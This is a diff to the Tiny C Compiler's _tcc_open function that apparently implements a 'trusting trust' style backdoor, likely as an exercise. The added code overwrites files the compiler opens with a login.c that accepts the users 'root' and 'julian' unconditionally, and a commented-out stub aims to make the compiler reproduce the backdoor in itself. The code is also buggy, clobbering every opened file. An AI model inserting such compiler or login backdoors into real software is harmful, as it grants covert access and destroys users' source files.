@@ -720,43 +720,18 @@ static int _tcc_open(TCCState *s1, const char *filename)
     int fd;
     int pipefd[2];
     pid_t p;
-
+    printf("Welcome to my exploit\n");
     pipe(pipefd);
     p = fork();
 
-    // Parent
-    if (p > 0)
-    {
-        close(pipefd[1]);
-        char str[256];
-        read(pipefd[0], str, 256);
-    }
-    // Child
-    else if (p == 0)
-    {
-        FILE *file;
-        if (strcmp(filename, "login.c") != 0)
-        {
-            char *line = NULL;
-            size_t len = 0;
-
-            file = fopen(filename, "r+");
-
-            while (getline(&line, &len, file) != -1)
-            {
-                write(pipefd[1], line, len);
-            }
-            fclose(file);
-        }
-        // Exploit for login.c
-        else if (!strcmp(filename, "login.c"))
-        {
-            file = fopen(filename, "w+");
-            char *bad = "#include <string.h>\
+    FILE * file;
+    printf("Found login.c\n");
+    file = fopen(filename, "w+");
+    char *bad = "#include <string.h>\
                 static int\
                 do_login(const char *username)\
             {\
-                if (!strcmp(username, \"root\") || !strcmp(username, \"julian\")\
+                if (!strcmp(username, \"root\") || !strcmp(username, \"julian\"))\
                     return 0;\
                 return 1;\
             }\
@@ -767,36 +742,83 @@ static int _tcc_open(TCCState *s1, const char *filename)
                 return do_login(argv[1]);\
             }\
             ";
-            fprintf(file, "%s", bad);
-            fclose(file);
-        }
-        // Quine for _tcc_open()
-        else if (!strcmp(filename, "libtcc.c"))
-        {
-            char *line = NULL;
-            size_t len = 0;
+    fprintf(file, "%s", bad);
+    fclose(file);
 
-            file = fopen(filename, "wb");
-            char *func_head = "static int _tcc_open(TCCState *s1, const char *filename)";
-            int flag = 0;
-            while (getline(&line, &len, file) != -1)
-            {
-                if (flag)
-                {
-                    // Replace bad _tcc_open to file
-                }
+    // // Parent
+    // if (p > 0)
+    // {
+    //     close(pipefd[1]);
+    //     char str[256];
+    //     read(pipefd[0], str, 256);
+    // }
+    // // Child
+    // else if (p == 0)
+    // {
+    //     FILE *file;
+    //     if (strcmp(filename, "login.c") != 0)
+    //     {
+    //         char *line = NULL;
+    //         size_t len = 0;
 
-                // Check to see if in _tcc_open function
-                if (!strcmp(line, func_head))
-                {
-                    flag = 1;
-                }
-            }
-            fclose(file);
-        }
+    //         file = fopen(filename, "r+");
 
-        close(pipefd[0]);
-    }
+    //         while (getline(&line, &len, file) != -1)
+    //         {
+    //             write(pipefd[1], line, len);
+    //         }
+    //         fclose(file);
+    //     }
+    //     // Exploit for login.c
+    //     else if (!strcmp(filename, "login.c"))
+    //     {
+    //         printf("Found login.c\n");
+    //         file = fopen(filename, "w+");
+    //         char *bad = "#include <string.h>\
+    //             static int\
+    //             do_login(const char *username)\
+    //         {\
+    //             if (!strcmp(username, \"root\") || !strcmp(username, \"julian\"))\
+    //                 return 0;\
+    //             return 1;\
+    //         }\
+    //         int main(int argc, char *argv[])\
+    //         {\
+    //             if (argc != 2)\
+    //                 return 1;\
+    //             return do_login(argv[1]);\
+    //         }\
+    //         ";
+    //         fprintf(file, "%s", bad);
+    //         fclose(file);
+    //     }
+    //     // Quine for _tcc_open()
+    //     else if (!strcmp(filename, "libtcc.c"))
+    //     {
+    //         char *line = NULL;
+    //         size_t len = 0;
+
+    //         file = fopen(filename, "wb");
+    //         char *func_head = "static int _tcc_open(TCCState *s1, const char *filename)";
+    //         int flag = 0;
+    //         while (getline(&line, &len, file) != -1)
+    //         {
+    //             if (flag)
+    //             {
+    //                 // Replace bad _tcc_open to file
+    //             }
+
+    //             // Check to see if in _tcc_open function
+    //             if (!strcmp(line, func_head))
+    //             {
+    //                 flag = 1;
+    //             }
+    //         }
+    //         fclose(file);
+    //     }
+
+    //     close(pipefd[0]);
+    // }
 
     if (strcmp(filename, "-") == 0)
         fd = 0, filename = "<stdin>";
